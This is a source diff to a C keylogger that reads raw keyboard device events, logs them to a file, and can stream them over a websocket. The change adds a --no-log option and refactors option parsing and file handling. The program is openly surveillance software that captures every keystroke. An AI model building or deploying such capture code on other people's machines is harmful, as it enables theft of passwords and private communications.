@@ -32,6 +32,7 @@ void print_help() {
     printf("Usage   : keylogger <options?>\n");
     printf("Options :\n");
     printf("  --dev <path>     Specify the device event to use\n");
+    printf("  --no-log         Disable writing key to the log file\n");
     printf("  --printk         Show keystrokes in terminal\n");
     printf("  --port <uint16>  Specify websocket port\n");
     printf("\n");
@@ -42,6 +43,7 @@ void print_help() {
 void signal_handler() { keep_running = false; }
 
 int main(int argc, char *argv[]) {
+    bool with_log = true;
     const char *target_device_name = NULL;
 #ifdef USE_LIBWEBSOCKETS
     uint16_t port = DEFAULT_PORT_WS;
@@ -52,6 +54,7 @@ int main(int argc, char *argv[]) {
 #ifdef USE_LIBWEBSOCKETS
         {"port",   required_argument, NULL, 0  },
 #endif
+        {"no-log", no_argument,       NULL, 0  },
         {"printk", no_argument,       NULL, 0  },
         {"help",   no_argument,       NULL, 'h'},
         {0,        0,                 0,    0  }
@@ -68,13 +71,18 @@ int main(int argc, char *argv[]) {
                 if (opt_index == 0) target_device_name = optarg;
 #ifdef USE_LIBWEBSOCKETS
                 if (opt_index == 1) port = atoi(optarg) != 0 ? (uint16_t)atoi(optarg) : DEFAULT_PORT_WS;
-                if (opt_index == 2) printk_active = true;
+                if (opt_index == 2) with_log = false;
+                if (opt_index == 3) printk_active = true;
 #else
-                if (opt_index == 1) printk_active = true;
+                if (opt_index == 1) with_log = false;
+                if (opt_index == 2) printk_active = true;
 #endif
                 break;
-            default:
+            case '?':
                 printf("Unknown option. Use -h or --help for help\n");
+                return EXIT_FAILURE;
+            default:
+                printf("Failed to parse options\n");
                 return EXIT_FAILURE;
         }
     }
@@ -98,8 +106,8 @@ int main(int argc, char *argv[]) {
         printf("Using keyboard device: %s\n", keyboard_path);
     }
 
-    FILE *file = fopen(LOG_FILE, "w");
-    if (!file) {
+    FILE *file = with_log ? fopen(LOG_FILE, "w") : NULL;
+    if (with_log && !file) {
         printf("Cannot open log file\n");
         free(keyboard_name);
         free(keyboard_path);
@@ -109,7 +117,7 @@ int main(int argc, char *argv[]) {
     int fd = open(keyboard_path, O_RDONLY);
     if (fd == -1) {
         printf("Cannot open keyboard device\n");
-        fclose(file);
+        if (with_log) fclose(file);
         free(keyboard_name);
         free(keyboard_path);
         return EXIT_FAILURE;
@@ -142,7 +150,7 @@ int main(int argc, char *argv[]) {
     if (init_websocket_server(port) != 0) {
         unsubscribe(&subject);
         close(fd);
-        fclose(file);
+        if (with_log) fclose(file);
         free(keyboard_name);
         free(keyboard_path);
         return EXIT_FAILURE;
@@ -187,9 +195,8 @@ int main(int argc, char *argv[]) {
                         } else if (state_capslock_active) {
                             capslock_active = state_capslock_active;
                         }
-                        if (state_key_name[0] != '\0') {
+                        if (state_key_name[0] != '\0')
                             log_key(file, &subject, ctrl_pressed, meta_pressed, alt_pressed, state_key_name);
-                        }
                         // Log other keys
                         const char *key_name = get_key_name(event.code, shift_pressed, capslock_active);
                         if (strcmp(key_name, "UNKNOWN") != 0) {
@@ -213,7 +220,7 @@ int main(int argc, char *argv[]) {
 
     unsubscribe(&subject);
     close(fd);
-    fclose(file);
+    if (with_log) fclose(file);
     free(keyboard_path);
 
 #ifdef USE_LIBWEBSOCKETS
